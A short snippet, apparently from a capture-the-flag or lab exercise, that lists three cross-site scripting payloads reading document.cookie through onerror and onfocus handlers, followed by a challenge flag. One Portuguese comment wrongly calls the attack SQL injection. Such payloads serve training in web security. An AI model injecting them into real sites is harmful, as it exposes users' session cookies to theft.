// alert(document.cookie); no Console DevTools
// ataque de SQL injection

<img src="x" onerror="alert(document.cookie)">
<iframe src="x" onerror="alert(document.cookie)"></iframe>
<input onfocus="alert(document.cookie)" value="Clique aqui">
  
// FLAG: FLAG{XSS_ATTACK_77}
